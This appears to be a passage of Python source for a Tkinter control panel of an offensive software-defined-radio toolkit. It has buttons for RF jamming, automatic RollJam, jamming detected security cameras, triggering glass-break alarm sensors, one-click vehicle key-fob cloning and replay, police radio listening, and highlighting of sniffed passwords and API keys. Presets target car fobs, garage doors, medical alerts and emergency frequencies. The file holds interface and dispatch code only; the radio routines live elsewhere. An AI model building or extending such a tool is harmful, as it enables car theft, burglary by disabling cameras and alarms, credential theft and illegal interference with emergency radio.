    def _create_matrix_tab(self):
        """Create the God Mode Matrix Visualization Tab"""
        tab = self.tab_matrix = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🎼 The Matrix")
        
        # Split Pane: Filters (Left) vs Stream (Right)
        paned = tk.PanedWindow(tab, orient=tk.HORIZONTAL, sashwidth=4, bg='#1E293B')
        paned.pack(fill=tk.BOTH, expand=True)
        
        # --- Left Panel: Controls ---
        left_panel = tk.Frame(paned, bg='#0F172A', width=200)
        paned.add(left_panel)
        
        tk.Label(left_panel, text="ACTIVE FILTERS", fg='#3B82F6', bg='#0F172A', font=('Arial', 10, 'bold')).pack(pady=10)
        
        # Filters
        self.var_show_wifi = tk.BooleanVar(value=True)
        tk.Checkbutton(left_panel, text="WiFi", variable=self.var_show_wifi, bg='#0F172A', fg='white', selectcolor='#0F172A', activebackground='#0F172A', activeforeground='white').pack(anchor='w', padx=10)
        
        self.var_show_ble = tk.BooleanVar(value=True)
        tk.Checkbutton(left_panel, text="Bluetooth", variable=self.var_show_ble, bg='#0F172A', fg='white', selectcolor='#0F172A', activebackground='#0F172A', activeforeground='white').pack(anchor='w', padx=10)
        
        self.var_show_subghz = tk.BooleanVar(value=True)
        tk.Checkbutton(left_panel, text="Sub-GHz", variable=self.var_show_subghz, bg='#0F172A', fg='white', selectcolor='#0F172A', activebackground='#0F172A', activeforeground='white').pack(anchor='w', padx=10)
        
        tk.Label(left_panel, text="\nHIGHLIGHTS", fg='#F59E0B', bg='#0F172A', font=('Arial', 10, 'bold')).pack(pady=10)
        self.matrix_pattern_list = tk.Listbox(left_panel, bg='#1E293B', fg='white', height=10, relief=tk.FLAT)
        self.matrix_pattern_list.pack(fill=tk.X, padx=5)
        self.matrix_pattern_list.insert(tk.END, "Email Addresses")
        self.matrix_pattern_list.insert(tk.END, "Passwords")
        self.matrix_pattern_list.insert(tk.END, "API Keys")
        
        # Pause Button
        self.matrix_paused = False
        self.btn_matrix_pause = tk.Button(left_panel, text="⏸ PAUSE STREAM", 
                                         command=lambda: self._toggle_matrix_pause(),
                                         bg='#EF4444', fg='white', relief=tk.FLAT)
        self.btn_matrix_pause.pack(fill=tk.X, padx=5, pady=20)
        
        # --- Right Panel: The Waterfall ---
        right_panel = tk.Frame(paned, bg='black')
        paned.add(right_panel)
        
        # Text Widget for Stream
        self.matrix_text = tk.Text(right_panel, bg='black', fg='#33FF33', 
                                  font=('Courier', 9), state='normal', wrap=tk.CHAR)
        scrollbar = tk.Scrollbar(right_panel, command=self.matrix_text.yview)
        self.matrix_text.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.matrix_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Tags for coloring
        self.matrix_text.tag_config('wifi', foreground='#10B981')  # Green
        self.matrix_text.tag_config('ble', foreground='#3B82F6')   # Blue
        self.matrix_text.tag_config('subghz', foreground='#F59E0B')# Orange
        self.matrix_text.tag_config('alert', foreground='#EF4444', background='#330000', font=('Courier', 9, 'bold')) 
        self.matrix_text.tag_config('intel', foreground='#000000', background='#FCD34D', font=('Courier', 9, 'bold')) # Yellow background for data
        
        # Subscribe to Visualizer
        self.visualizer.subscribe(self._on_matrix_packet)
        # Subscribe to Intel Collector too!
        from core.intel_collector import intel_collector
        intel_collector.subscribe(self._on_intel_from_collector)

    def _on_intel_from_collector(self, obs):
        """Show intel directly in the matrix too"""
        if hasattr(self, 'matrix_paused') and self.matrix_paused: return
        self.root.after(0, lambda: self._append_intel_to_matrix(obs))

    def _append_intel_to_matrix(self, obs):
        if not hasattr(self, 'matrix_text'): return
        line = f" >>> [INTEL] Found {obs.data_type}: {obs.value} | Network: {obs.network} | Context: {obs.context}\n"
        self.matrix_text.insert(tk.END, line, ('intel',))
        self.matrix_text.see(tk.END)
        
    def _toggle_matrix_pause(self):
        self.matrix_paused = not self.matrix_paused
        txt = "▶ RESUME STREAM" if self.matrix_paused else "⏸ PAUSE STREAM"
        bg = "#10B981" if self.matrix_paused else "#EF4444"
        self.btn_matrix_pause.config(text=txt, bg=bg)
        
    def _on_matrix_packet(self, pkt):
        """Callback from Visualizer thread"""
        if hasattr(self, 'matrix_paused') and self.matrix_paused: return
        
        # Check filters
        if hasattr(self, 'var_show_wifi') and pkt.protocol == "WiFi" and not self.var_show_wifi.get(): return
        
        # Schedule GUI update
        self.root.after(0, lambda: self._append_matrix_line(pkt))
        
    def _append_matrix_line(self, pkt):
        """Append line to text widget safely"""
        if not hasattr(self, 'matrix_text'): return
        
        # Trim if too long
        try:
            line_count = int(self.matrix_text.index('end-1c').split('.')[0])
            if line_count > 2000:
                self.matrix_text.delete('1.0', '500.0')
        except: pass
            
        timestamp = time.strftime('%H:%M:%S', time.localtime(pkt.timestamp))
        line = f"[{timestamp}] [{pkt.protocol}] {pkt.payload_ascii[:80]}\n"
        
        tag = 'wifi'
        if 'Blue' in pkt.protocol: tag = 'ble'
        elif 'Sub' in pkt.protocol: tag = 'subghz'
        
        try:
            self.matrix_text.insert(tk.END, line, (tag,))
            if pkt.tags:
                 self.matrix_text.insert(tk.END, f"    >>> ALERT: Found {pkt.tags}\n", ('alert',))
            self.matrix_text.see(tk.END)
        except: pass

    # --- Attack Tab Implementation ---
    def _create_spectrum_tab(self):
        """Live Frequency Spectrum Visualizer"""
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="📊 Spectrum")
        
        # Title
        tk.Label(tab, text="Live Frequency Spectrum", font=('Arial', 14, 'bold'),
                fg='#10B981', bg='#0F172A').pack(pady=10)
        
        # Canvas for spectrum plot
        canvas_frame = tk.Frame(tab, bg='#1E293B')
        canvas_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.spectrum_canvas = tk.Canvas(canvas_frame, bg='#000000', height=400)
        self.spectrum_canvas.pack(fill=tk.BOTH, expand=True)
        
        # Info labels
        info_frame = tk.Frame(tab, bg='#0F172A')
        info_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.spectrum_freq_label = tk.Label(info_frame, text="Frequency: --.- MHz", 
                                           bg='#0F172A', fg='#3B82F6', font=('Courier', 11, 'bold'))
        self.spectrum_freq_label.pack(side=tk.LEFT, padx=10)
        
        self.spectrum_rssi_label = tk.Label(info_frame, text="RSSI: -- dBm", 
                                           bg='#0F172A', fg='#10B981', font=('Courier', 11, 'bold'))
        self.spectrum_rssi_label.pack(side=tk.LEFT, padx=10)
        
        # Spectrum data storage
        self.spectrum_data = {
            315.0: [],  # RSSI history for 315 MHz
            433.92: []  # RSSI history for 433.92 MHz
        }
        self.spectrum_max_history = 100
        
        # Start spectrum updater
        self._update_spectrum()
    
    def _update_spectrum(self):
        """Update spectrum display"""
        if not hasattr(self, 'spectrum_canvas'):
            return
        
        try:
            # Clear canvas
            self.spectrum_canvas.delete("all")
            
            width = self.spectrum_canvas.winfo_width()
            height = self.spectrum_canvas.winfo_height()
            
            if width < 10 or height < 10:
                self.root.after(500, self._update_spectrum)
                return
            
            # Draw grid
            for i in range(0, height, 50):
                self.spectrum_canvas.create_line(0, i, width, i, fill='#1E293B', width=1)
            
            # Draw frequency bars for 315 and 433 MHz
            bar_width = width // 3
            x_315 = width // 4
            x_433 = 3 * width // 4
            
            # Get latest RSSI from auto engine if running
            rssi_315 = -80  # Default
            rssi_433 = -80
            
            if hasattr(self, 'auto_engine') and self.auto_engine and hasattr(self.auto_engine, 'last_rssi'):
                # Try to get recent RSSI data
                pass
            
            # Draw 315 MHz bar
            rssi_normalized_315 = max(0, min(1, (rssi_315 + 100) / 50))  # Map -100 to -50 dBm to 0-1
            bar_height_315 = int(rssi_normalized_315 * (height - 50))
            
            color_315 = '#10B981' if rssi_315 > -70 else '#F59E0B' if rssi_315 > -85 else '#666666'
            self.spectrum_canvas.create_rectangle(
                x_315 - bar_width//2, height - bar_height_315 - 20,
                x_315 + bar_width//2, height - 20,
                fill=color_315, outline='#FFFFFF', width=2
            )
            self.spectrum_canvas.create_text(x_315, height - 5, text="315 MHz", 
                                            fill='#FFFFFF', font=('Arial', 10, 'bold'))
            self.spectrum_canvas.create_text(x_315, height - bar_height_315 - 30, 
                                            text=f"{rssi_315:.1f} dBm",
                                            fill=color_315, font=('Arial', 9, 'bold'))
            
            # Draw 433 MHz bar
            rssi_normalized_433 = max(0, min(1, (rssi_433 + 100) / 50))
            bar_height_433 = int(rssi_normalized_433 * (height - 50))
            
            color_433 = '#10B981' if rssi_433 > -70 else '#F59E0B' if rssi_433 > -85 else '#666666'
            self.spectrum_canvas.create_rectangle(
                x_433 - bar_width//2, height - bar_height_433 - 20,
                x_433 + bar_width//2, height - 20,
                fill=color_433, outline='#FFFFFF', width=2
            )
            self.spectrum_canvas.create_text(x_433, height - 5, text="433.92 MHz",
                                            fill='#FFFFFF', font=('Arial', 10, 'bold'))
            self.spectrum_canvas.create_text(x_433, height - bar_height_433 - 30,
                                            text=f"{rssi_433:.1f} dBm",
                                            fill=color_433, font=('Arial', 9, 'bold'))
            
            # Draw threshold line
            threshold_y = height - int(0.5 * (height - 50)) - 20  # -75 dBm line
            self.spectrum_canvas.create_line(0, threshold_y, width, threshold_y,
                                            fill='#DC2626', dash=(5, 5), width=2)
            self.spectrum_canvas.create_text(10, threshold_y - 10, text="Trigger Threshold",
                                            fill='#DC2626', anchor='w', font=('Arial', 8))
            
        except Exception as e:
            print(f"[Spectrum] Update error: {e}")
        
        # Schedule next update
        self.root.after(200, self._update_spectrum)
    def _create_attacks_tab(self):
        """Attacks Control Panel"""
        # Rename to just "RF Operations" or similar? tailored to user request.
        tab = tk.Frame(self.notebook, bg='#0F172A')
        self.notebook.add(tab, text="🔥 RF Operations")
        
        # Single main frame since we deleted the split
        main_frame = tk.Frame(tab, bg='#1E293B')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tk.Label(main_frame, text="📻 Sub-GHz & Hardware Control", font=('Arial', 12, 'bold'),
                fg='#DC2626', bg='#1E293B').pack(anchor=tk.W, padx=10, pady=5)
        
        # Jammer Controls
        jam_frame = tk.LabelFrame(main_frame, text="RF Jammer", bg='#1E293B', fg='white')
        jam_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(jam_frame, text="Frequency (MHz):", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=5)
        self.jam_freq = tk.Entry(jam_frame, width=10)
        self.jam_freq.insert(0, "315.00")
        self.jam_freq.pack(side=tk.LEFT, padx=5)
        
        # For compatibility with _jam_replay which uses rf_freq_var
        self.rf_freq_var = tk.StringVar(value="433.92") 
        
        self.btn_jam = tk.Button(jam_frame, text="START JAMMING", command=self._toggle_jamming,
                 bg='#DC2626', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT)
        self.btn_jam.pack(side=tk.LEFT, padx=10)
        
        # Auto-Record (SubGHz)
        self.var_auto_subghz = tk.BooleanVar(value=False)  # Default OFF - user can enable manually
        tk.Checkbutton(jam_frame, text="Auto-Record All Signals", variable=self.var_auto_subghz,
                      command=self._toggle_auto_subghz, bg='#1E293B', fg='#DC2626',
                      selectcolor='#1E293B', activebackground='#1E293B', font=('Arial', 10, 'bold')).pack(side=tk.LEFT, padx=20)
        
        # Auto RollJam toggle
        self.auto_rolljam_active = False
        self.btn_auto_rolljam = tk.Button(jam_frame, text="🚨 AUTO ROLLJAM: OFF", command=self._toggle_auto_rolljam,
                 bg='#334155', fg='white', font=('Arial', 9, 'bold'), relief=tk.FLAT)
        self.btn_auto_rolljam.pack(side=tk.LEFT, padx=10)

        # Trigger the callback for the default True value
        self._toggle_auto_subghz()
        
        # Audio Listening Controls
        audio_frame = tk.LabelFrame(main_frame, text="🔊 Audio Listening (Police/Public Safety)", bg='#1E293B', fg='white')
        audio_frame.pack(fill=tk.X, padx=10, pady=5)
        
        audio_row1 = tk.Frame(audio_frame, bg='#1E293B')
        audio_row1.pack(fill=tk.X, padx=5, pady=5)
        
        # Listen button
        self.btn_listen = tk.Button(audio_row1, text="🔊 LISTEN", command=self._toggle_audio_listen,
                 bg='#10B981', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=12)
        self.btn_listen.pack(side=tk.LEFT, padx=5)
        
        # Scan button
        self.btn_audio_scan = tk.Button(audio_row1, text="📡 SCAN BAND", command=self._toggle_audio_scan,
                 bg='#3B82F6', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=12)
        self.btn_audio_scan.pack(side=tk.LEFT, padx=5)
        
        # Modulation selector
        tk.Label(audio_row1, text="Modulation:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(10,2))
        self.audio_mod_var = tk.StringVar(value="NFM")
        self.audio_mod_combo = ttk.Combobox(audio_row1, textvariable=self.audio_mod_var, 
                                            state='readonly', width=8)
        self.audio_mod_combo['values'] = ['AM', 'NFM', 'FM']
        self.audio_mod_combo.pack(side=tk.LEFT, padx=2)
        
        # Auto-Seek toggle
        self.audio_autoseek_var = tk.BooleanVar(value=True)
        tk.Checkbutton(audio_row1, text="Auto-Seek", variable=self.audio_autoseek_var,
                       bg='#1E293B', fg='white', selectcolor='#0F172A', activebackground='#1E293B',
                       command=self._on_autoseek_toggle).pack(side=tk.LEFT, padx=10)
        
        # Volume control
        tk.Label(audio_row1, text="Volume:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(10,2))
        self.audio_volume_var = tk.DoubleVar(value=50)
        self.audio_volume_slider = tk.Scale(audio_row1, from_=0, to=100, orient=tk.HORIZONTAL,
                                           variable=self.audio_volume_var, bg='#1E293B', fg='white',
                                           highlightthickness=0, length=100, command=self._on_volume_change)
        self.audio_volume_slider.pack(side=tk.LEFT, padx=2)
        
        # Frequency display
        self.audio_freq_label = tk.Label(audio_row1, text="Freq: --.-", bg='#1E293B', fg='#3B82F6',
                                        font=('Courier', 10, 'bold'))
        self.audio_freq_label.pack(side=tk.LEFT, padx=10)
        
        # Actual/Peak Freq display
        self.audio_peak_label = tk.Label(audio_row1, text="Peak: --.-", bg='#1E293B', fg='#F59E0B',
                                        font=('Courier', 10, 'bold'))
        self.audio_peak_label.pack(side=tk.LEFT, padx=10)

        # Audio Row 2: Squelch and RSSI
        audio_row2 = tk.Frame(audio_frame, bg='#1E293B')
        audio_row2.pack(fill=tk.X, padx=5, pady=(0,5))
        
        # Squelch control
        tk.Label(audio_row2, text="Squelch:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(5,2))
        self.audio_squelch_var = tk.DoubleVar(value=-50)
        self.audio_squelch_slider = tk.Scale(audio_row2, from_=-100, to=0, orient=tk.HORIZONTAL,
                                            variable=self.audio_squelch_var, bg='#1E293B', fg='white',
                                            highlightthickness=0, length=150, command=self._on_squelch_change)
        self.audio_squelch_slider.pack(side=tk.LEFT, padx=2)
        
        # RSSI Bar
        tk.Label(audio_row2, text="RSSI:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(20,2))
        self.audio_rssi_bar = ttk.Progressbar(audio_row2, length=200, mode='determinate')
        self.audio_rssi_bar.pack(side=tk.LEFT, padx=5)
        
        # Initialize audio demodulator (lazy init)
        self.audio_demod = None
        
        # ===== CAMERA TAKEDOWN PANEL =====
        camera_frame = tk.LabelFrame(main_frame, text="📷 Camera Takedown (WiFi Jamming)", bg='#1E293B', fg='white')
        camera_frame.pack(fill=tk.X, padx=10, pady=5)
        
        camera_row1 = tk.Frame(camera_frame, bg='#1E293B')
        camera_row1.pack(fill=tk.X, padx=5, pady=5)
        
        # Camera detection button
        self.btn_detect_cameras = tk.Button(camera_row1, text="🔍 DETECT CAMERAS", command=self._detect_cameras,
                 bg='#3B82F6', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=16)
        self.btn_detect_cameras.pack(side=tk.LEFT, padx=5)
        
        # Band selector
        tk.Label(camera_row1, text="Band:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(10,2))
        self.camera_band_var = tk.StringVar(value="2.4GHz")
        self.camera_band_combo = ttk.Combobox(camera_row1, textvariable=self.camera_band_var, 
                                            state='readonly', width=8)
        self.camera_band_combo['values'] = ['2.4GHz', '5GHz', 'both']
        self.camera_band_combo.pack(side=tk.LEFT, padx=2)
        
        # Jam button
        self.btn_jam_cameras = tk.Button(camera_row1, text="🎯 JAM CAMERAS", command=self._jam_cameras,
                 bg='#DC2626', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=14)
        self.btn_jam_cameras.pack(side=tk.LEFT, padx=10)
        
        # Stop jam button
        self.btn_stop_camera_jam = tk.Button(camera_row1, text="⏹ STOP JAM", command=self._stop_camera_jam,
                 bg='#334155', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=12)
        self.btn_stop_camera_jam.pack(side=tk.LEFT, padx=5)
        
        # Camera status label
        self.camera_status_label = tk.Label(camera_row1, text="Ready", bg='#1E293B', fg='#10B981',
                                           font=('Courier', 10, 'bold'))
        self.camera_status_label.pack(side=tk.LEFT, padx=10)
        
        # Detected cameras list (small)
        camera_row2 = tk.Frame(camera_frame, bg='#1E293B')
        camera_row2.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.camera_tree = ttk.Treeview(camera_row2, columns=('Vendor', 'MAC', 'Channel', 'RSSI'), 
                                        show='headings', height=3)
        self.camera_tree.heading('Vendor', text='Vendor')
        self.camera_tree.heading('MAC', text='MAC Address')
        self.camera_tree.heading('Channel', text='Channel')
        self.camera_tree.heading('RSSI', text='Signal')
        self.camera_tree.column('Vendor', width=120)
        self.camera_tree.column('MAC', width=140)
        self.camera_tree.column('Channel', width=60)
        self.camera_tree.column('RSSI', width=60)
        self.camera_tree.pack(fill=tk.BOTH, expand=True)
        
        # Initialize camera jammer (lazy init)
        self.camera_jammer = None
        
        # ===== GLASS BREAK ALARM PANEL =====
        glass_frame = tk.LabelFrame(main_frame, text="🔨 Glass Break Alarm (RF Sensor Triggering)", bg='#1E293B', fg='white')
        glass_frame.pack(fill=tk.X, padx=10, pady=5)
        
        glass_row1 = tk.Frame(glass_frame, bg='#1E293B')
        glass_row1.pack(fill=tk.X, padx=5, pady=5)
        
        # Detect sensors button
        self.btn_detect_glass = tk.Button(glass_row1, text="🔍 DETECT SENSORS", command=self._detect_glass_break,
                 bg='#3B82F6', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=16)
        self.btn_detect_glass.pack(side=tk.LEFT, padx=5)
        
        # Frequency selector
        tk.Label(glass_row1, text="Freq:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(10,2))
        self.glass_freq_var = tk.StringVar(value="433.92")
        self.glass_freq_combo = ttk.Combobox(glass_row1, textvariable=self.glass_freq_var, 
                                            state='readonly', width=8)
        self.glass_freq_combo['values'] = ['315.0', '433.92', '868.35']
        self.glass_freq_combo.pack(side=tk.LEFT, padx=2)
        
        # Trigger selected button
        self.btn_trigger_glass = tk.Button(glass_row1, text="🚨 TRIGGER SELECTED", command=self._trigger_glass_break,
                 bg='#F59E0B', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=16)
        self.btn_trigger_glass.pack(side=tk.LEFT, padx=10)
        
        # Test synthetic button
        self.btn_test_synthetic = tk.Button(glass_row1, text="🧪 TEST SYNTHETIC", command=self._test_synthetic_glass,
                 bg='#8B5CF6', fg='white', font=('Arial', 10, 'bold'), relief=tk.FLAT, width=14)
        self.btn_test_synthetic.pack(side=tk.LEFT, padx=5)
        
        # Glass break status
        self.glass_status_label = tk.Label(glass_row1, text="Ready", bg='#1E293B', fg='#10B981',
                                          font=('Courier', 10, 'bold'))
        self.glass_status_label.pack(side=tk.LEFT, padx=10)
        
        # Detected sensors list (small)
        glass_row2 = tk.Frame(glass_frame, bg='#1E293B')
        glass_row2.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.glass_tree = ttk.Treeview(glass_row2, columns=('ID', 'Freq', 'Strength', 'Time'), 
                                       show='headings', height=3)
        self.glass_tree.heading('ID', text='Sensor ID')
        self.glass_tree.heading('Freq', text='Frequency')
        self.glass_tree.heading('Strength', text='Signal')
        self.glass_tree.heading('Time', text='Detected At')
        self.glass_tree.column('ID', width=100)
        self.glass_tree.column('Freq', width=80)
        self.glass_tree.column('Strength', width=80)
        self.glass_tree.column('Time', width=140)
        self.glass_tree.pack(fill=tk.BOTH, expand=True)
        
        # Initialize glass break attack (lazy init)
        self.glass_break_attack = None
        

        # Saved RF Signals Table (INTEGRATED)
        fob_frame = tk.LabelFrame(main_frame, text="RF Signals (Saved & Replay)", bg='#1E293B', fg='white')
        fob_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        # Quick Controls
        rf_ctrl = tk.Frame(fob_frame, bg='#1E293B')
        rf_ctrl.pack(fill=tk.X, padx=5, pady=5)
        
        # Presets UI
        tk.Label(rf_ctrl, text="Preset:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT)
        self.preset_var = tk.StringVar()
        self.preset_combo = ttk.Combobox(rf_ctrl, textvariable=self.preset_var, state='readonly', width=30)
        self.preset_combo.pack(side=tk.LEFT, padx=5)
        self.preset_combo['values'] = [p['name'] for p in self._get_presets_list()]
        self.preset_combo.bind('<<ComboboxSelected>>', self._on_preset_select)
        
        # Attack Type Selector
        tk.Label(rf_ctrl, text="Attack:", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT, padx=(15,0))
        self.attack_type_var = tk.StringVar(value="Replay")
        self.attack_type_combo = ttk.Combobox(rf_ctrl, textvariable=self.attack_type_var, state='readonly', width=15)
        self.attack_type_combo.pack(side=tk.LEFT, padx=5)
        self.attack_type_combo['values'] = ['Replay', 'Jam', 'Monitor']
        
        tk.Label(rf_ctrl, text=" | ", bg='#1E293B', fg='#555').pack(side=tk.LEFT)
        
        # Execute Attack Button
        tk.Button(rf_ctrl, text="⚡ EXECUTE", command=self._execute_attack, 
                 bg='#DC2626', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        # Clone Button (One-Click Vehicle Cloning)
        tk.Button(rf_ctrl, text="🔑 CLONE", command=self._quick_clone, 
                 bg='#8B5CF6', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        tk.Label(rf_ctrl, text=" | ", bg='#1E293B', fg='#555').pack(side=tk.LEFT)
        
        # Manual Quick Buttons
        tk.Button(rf_ctrl, text="315M", command=lambda: self._quick_scan(315), bg='#2563EB', fg='white', width=4).pack(side=tk.LEFT, padx=2)
        tk.Button(rf_ctrl, text="433M", command=lambda: self._quick_scan(433.92), bg='#2563EB', fg='white', width=4).pack(side=tk.LEFT, padx=2)
        ttk.Button(rf_ctrl, text="Refresh List", command=self._refresh_rf_list).pack(side=tk.RIGHT, padx=2)
        
        # Replay Button
        tk.Button(rf_ctrl, text="▶ REPLAY", command=self._replay_selected, 
                 bg='#10B981', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.RIGHT, padx=5)
        
        # Replay All Button
        tk.Button(rf_ctrl, text="▶▶ REPLAY ALL", command=self._replay_all, 
                 bg='#F59E0B', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.RIGHT, padx=5)

        # Main RF Tree (self.rf_tree)
        columns = ("ID", "Timestamp", "Frequency", "Samples")
        self.rf_tree = ttk.Treeview(fob_frame, columns=columns, show='headings', height=8)
        self.rf_tree.heading("ID", text="ID")
        self.rf_tree.heading("Timestamp", text="Timestamp")
        self.rf_tree.heading("Frequency", text="Frequency")
        self.rf_tree.heading("Samples", text="Samples")
        self.rf_tree.column("ID", width=30)
        self.rf_tree.column("Timestamp", width=120)
        self.rf_tree.column("Frequency", width=80)
        self.rf_tree.column("Samples", width=80)
        self.rf_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # SDR Wi-Fi Handshake (This is WiFi, so remove it)
        # wifi_h_frame = tk.Frame(right, bg='#1E293B')
        # wifi_h_frame.pack(fill=tk.X, padx=10, pady=5)
        # tk.Label(wifi_h_frame, text="SDR Wi-Fi Capture (Ch):", bg='#1E293B', fg='#ccc').pack(side=tk.LEFT)
        # self.wifi_sdr_ch_entry = ttk.Entry(wifi_h_frame, width=5)
        # self.wifi_sdr_ch_entry.insert(0, "6")
        # self.wifi_sdr_ch_entry.pack(side=tk.LEFT, padx=5)
        # ttk.Button(wifi_h_frame, text="Start Capture", command=self._launch_sdr_wifi_capture).pack(side=tk.LEFT, padx=5)
        
        # STATUS BAR (Bottom of Tab)
        status_frame = tk.LabelFrame(tab, text="📊 RF Status", bg='#0F172A', fg='#3B82F6', font=('Arial', 10, 'bold'), padx=5, pady=5)
        status_frame.pack(side=tk.BOTTOM, fill='x', padx=10, pady=10)
        self.attack_status_text = tk.Text(status_frame, height=6, bg='black', fg='#00FF00')
        self.attack_status_text.pack(fill='both')
        
                 
    def _toggle_jamming(self):
        """Toggle Simple Jamming"""
        self._stop_active_engines(except_module='jam')
        if not self.subghz or not self.subghz.sdr: return
        
        btn_text = self.btn_jam.cget('text')
        if "START" in btn_text:
            try:
                freq = float(self.jam_freq.get())
                # Basic HackRF jamming via controller if supported
                # For now, just a stub log as per previous code style or call sdr_controller.start_jamming
                if self.subghz.sdr:
                     # Check if already jamming
                     # Note: state tracking might be needed
                     self._log_attack_status(f"Starting Jammer on {freq} MHz (Broadband Noise)...")
                     self.subghz.sdr.start_jamming(freq * 1e6)
                     self.btn_jam.config(text="STOP JAMMING", bg='#000')
            except ValueError:
                messagebox.showerror("Error", "Invalid Frequency")
        else:
            if self.subghz.sdr:
                self.subghz.sdr.stop_jamming()
            self.btn_jam.config(text="START JAMMING", bg='#DC2626')
            self._log_attack_status("Jammer STOPPED")

    def _quick_scan(self, freq):
        """Switch SDR frequency"""
        if not hasattr(self, 'subghz'): 
            messagebox.showerror("Error", "Sub-GHz Scanner not loaded")
            return
            
        # Set frequency and enable
        self.subghz.frequencies = [freq * 1e6]
        self.subghz.enable_scanning(True)
        
        messagebox.showinfo("Scanner", f"Scanning {freq}MHz...\nHardware scanner activated.\nWaiting for signal...")
        self._log_attack_status(f"Sub-GHz: Scanning {freq}MHz (Manual Mode)")
        
    def _replay_selected(self):
        selection = self.rf_tree.selection()
        if not selection: return
        
        item = self.rf_tree.item(selection[0])
        signal_id = item['values'][0]
        
        rec = self.scanner_modules.get('recorder')
        if rec:
             if rec.replay(signal_id):
                 messagebox.showinfo("Replay", "Signal transmitted successfully")
             else:
                 messagebox.showerror("Error", "Replay failed")
        else:
             messagebox.showerror("Error", "Recorder module not linked")
    
    def _get_presets_list(self):
        """Comprehensive Sub-GHz preset list for HackRF (10 MHz - 6 GHz)"""
        return [
            # === Car Key Fobs ===
            {'name': 'Car Fob (US/Asia 315)', 'freq': 315.00, 'category': 'car'},
            {'name': 'Car Fob (EU 433.92)', 'freq': 433.92, 'category': 'car'},
            {'name': 'Car Fob (Japan 315)', 'freq': 315.00, 'category': 'car'},
            
            # === Garage Doors & Gate Openers ===
            {'name': 'Garage (Genie/Chamberlain 315)', 'freq': 315.00, 'category': 'car'},
            {'name': 'Garage (Chamberlain 390)', 'freq': 390.00, 'category': 'car'},
            {'name': 'Garage (Universal 433.92)', 'freq': 433.92, 'category': 'car'},
            {'name': 'Gate (Linear MegaCode 318)', 'freq': 318.00, 'category': 'car'},
            {'name': 'Gate (Nice/CAME 433.92)', 'freq': 433.92, 'category': 'car'},
            
            # === TPMS (Tire Pressure Monitoring) ===
            {'name': 'TPMS (US 315)', 'freq': 315.00, 'category': 'iot'},
            {'name': 'TPMS (EU 433.92)', 'freq': 433.92, 'category': 'iot'},
            
            # === Weather Stations & Environmental ===
            {'name': 'Weather Station (433.92)', 'freq': 433.92, 'category': 'iot'},
            {'name': 'Weather (US 915)', 'freq': 915.00, 'category': 'iot'},
            {'name': 'Weather (EU 868)', 'freq': 868.00, 'category': 'iot'},
            
            # === Doorbells & Chimes ===
            {'name': 'Doorbell (433.92)', 'freq': 433.92, 'category': 'iot'},
            {'name': 'Doorbell (315)', 'freq': 315.00, 'category': 'iot'},
            
            # === Smart Home / IoT ===
            {'name': 'Smart Meter (US 915)', 'freq': 915.00, 'category': 'iot'},
            {'name': 'Smart Home (868)', 'freq': 868.00, 'category': 'iot'},
            {'name': 'Z-Wave (US)', 'freq': 908.42, 'category': 'iot'},
            {'name': 'Z-Wave (EU)', 'freq': 868.42, 'category': 'iot'},
            
            # === Industrial & Commercial ===
            {'name': 'ISM (US 315)', 'freq': 315.00, 'category': 'iot'},
            {'name': 'ISM (US 915)', 'freq': 915.00, 'category': 'iot'},
            {'name': 'ISM (EU 868)', 'freq': 868.00, 'category': 'iot'},
            {'name': 'Industrial (433.92)', 'freq': 433.92, 'category': 'iot'},
            
            # === Emergency & Public Safety ===
            {'name': 'Medical Alert (433.92)', 'freq': 433.92, 'category': 'iot'},
            {'name': 'Police VHF (150-160 MHz)', 'freq': 155.00, 'category': 'public_safety'},
            {'name': 'Police UHF (450-470 MHz)', 'freq': 460.00, 'category': 'public_safety'},
            {'name': 'P25 Trunked (700-800 MHz)', 'freq': 770.00, 'category': 'public_safety'},
            {'name': '800MHz Police Trunking', 'freq': 855.00, 'category': 'public_safety'},
            
            # === Aviation ===
            {'name': 'Aviation Band (AM)', 'freq': 120.00, 'category': 'aviation'},
            {'name': 'Aviation Emergency (121.5)', 'freq': 121.50, 'category': 'aviation'},
            {'name': 'Military Emergency (243)', 'freq': 243.00, 'category': 'aviation'},
            
            # === Marine ===
            {'name': 'Marine VHF Ch 16', 'freq': 156.80, 'category': 'marine'},
            
            # === Amateur Radio ===
            {'name': 'Amateur 2m (144-148)', 'freq': 146.00, 'category': 'amateur'},
